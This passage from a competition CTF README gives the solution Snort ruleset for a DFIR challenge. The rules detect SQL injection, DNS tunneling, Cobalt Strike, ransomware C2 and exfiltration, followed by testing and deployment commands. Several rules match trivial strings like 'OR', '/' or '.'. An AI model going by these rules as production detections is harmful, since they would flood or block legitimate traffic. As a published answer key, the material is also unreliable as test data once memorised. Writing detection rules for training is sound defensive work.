alert tcp any any -> any 80 (msg:"SQL Injection UNION SELECT"; content:"UNION"; nocase; sid:1000002;)
alert tcp any any -> any 80 (msg:"SQL Injection OR Attack"; content:"OR"; nocase; sid:1000003;)
alert tcp any any -> any 80 (msg:"SQL Injection DROP TABLE"; content:"DROP"; nocase; sid:1000004;)

alert udp any any -> any 53 (msg:"DNS Tunneling Domain"; content:".t"; nocase; sid:1000005;)
alert udp any any -> any 53 (msg:"DNS Tunneling Base64"; content:"-"; nocase; pcre:"/[a-zA-Z0-9]{10,}/"; sid:1000006;)
alert udp any any -> any 53 (msg:"DNS Tunneling Exfil"; content:".e"; nocase; sid:1000007;)

alert tcp any any -> any 443 (msg:"Cobalt Strike Beacon"; content:"/"; nocase; sid:1000008;)
alert tcp any any -> any 443 (msg:"Cobalt Strike Pixel"; content:"."; nocase; sid:1000009;)
alert tcp any any -> any 443 (msg:"Cobalt Strike Activity"; content:"activity"; nocase; sid:1000010;)

alert tcp any any -> any 443 (msg:"Ransomware C2 Register"; content:"/api"; nocase; sid:1000011;)
alert tcp any any -> any 443 (msg:"Ransomware C2 Checkin"; content:"checkin"; nocase; pcre:"/id=/"; sid:1000012;)
alert tcp any any -> any 443 (msg:"Ransomware C2 Key Exchange"; content:"key="; nocase; sid:1000013;)

alert tcp any any -> any 80 (msg:"Data Exfiltration"; content:"Content-Type: application/msword"; nocase; sid:1000014;)
alert tcp any any -> any 80 (msg:"Data Exfiltration"; content:"Content-Disposition: form-data"; nocase; sid:1000015;)
alert tcp any any -> any 80 (msg:"Data Exfiltration"; content:"POST /sync"; nocase; sid:1000016;)
alert tcp any any -> any 80 (msg:"Data Exfiltration"; content:".sql"; nocase; sid:1000017;)
EOF
```

### Testing Rules

```bash
snort -c /etc/snort/snort.conf -r sample.pcap -A console
```

**Expected Output:**

```
[**] [1:1000001:0] SSH Brute Force Attack [**]
[**] [1:1000002:0] SQL Injection UNION SELECT [**]
[**] [1:1000005:0] DNS Tunneling Domain [**]
[**] [1:1000008:0] Cobalt Strike Beacon [**]
[**] [1:1000011:0] Ransomware C2 Register [**]
[**] [1:1000014:0] Data Exfiltration [**]
```

### Rule Validation

```bash
snort -c /etc/snort/snort.conf -T
```

Verify all rules load without errors.

### Production Deployment

#### Inline IPS Mode

```bash
snort -Q -c /etc/snort/snort.conf -i eth0
```

#### NIDS Mode

```bash
snort -c /etc/snort/snort.conf -i eth0 -A fast -l /var/log/snort
```

### Integration with SIEM

```bash
tail -f /var/log/snort/alert | while read line; do
    echo "$line" | logger -t snort -p local0.alert
done
```

Forward to Splunk, ELK, or other SIEM platforms.

---

## Repository

### GitHub Repository

[https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/NetRules%20Hunter](https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/NetRules%20Hunter)

### Repository Structure

```
NetRules Hunter/
├── README.md
├── create.py                  (Traffic generation script)
├── excatrct.sh               (Attack extraction script)
├── template.rules            (Rule template)
├── solution.rules            (Solution ruleset)
├── sample.pcap               (Generated traffic - not included)
└── app/
    ├── app.py
    ├── config.cfg
    ├── requirements.txt
    └── assets/
```

### Deployment Instructions

#### Challenge Application

```bash
cd app

docker build -t netrules .
docker run -d --name NetRules -p 5001:5001 --restart unless-stopped netrules
```

Access at: http://localhost:5001

#### Generate Traffic

```bash
python3 create.py
```

This creates sample.pcap with all attack patterns.

#### Extract Attack Patterns

```bash
chmod +x excatrct.sh
./excatrct.sh
```

#### Write Detection Rules

Edit local.rules with Snort detection rules following the template.

#### Test Rules

```bash
snort -c /etc/snort/snort.conf -r sample.pcap -A console
```

---

## References

### Snort Documentation

- Snort Manual: [https://www.snort.org/documents](https://www.snort.org/documents)
- Rule Writing Guide: [https://docs.snort.org/rules/](https://docs.snort.org/rules/)
- Snort FAQ: [https://www.snort.org/faq](https://www.snort.org/faq)

### Network Security

- Wireshark User Guide: [https://www.wireshark.org/docs/wsug_html/](https://www.wireshark.org/docs/wsug_html/)
- tcpdump Manual: [https://www.tcpdump.org/manpages/tcpdump.1.html](https://www.tcpdump.org/manpages/tcpdump.1.html)
- PCAP Analysis: [https://www.netresec.com/](https://www.netresec.com/)

### Attack Techniques

- SQL Injection: [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- DNS Tunneling: [https://unit42.paloaltonetworks.com/dns-tunneling/](https://unit42.paloaltonetworks.com/dns-tunneling/)
- Cobalt Strike: [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/)

---

## Authors

Challenge Designer: Qays Sarayra  
Contact: info@qayssarayra.com  
Specialization: Network Security, Intrusion Detection, Traffic Analysis

---

## License

This challenge is part of IEEE CyberSecurity Competition 2025 - Qualification Round.

Educational use only. All traffic is synthetically generated for training purposes.

---

Competition: IEEE CyberSecurity Competition 2025  
Round: Qualification  
Category: DFIR  
Difficulty: Medium  
Expected Completion Time: 2-3 hours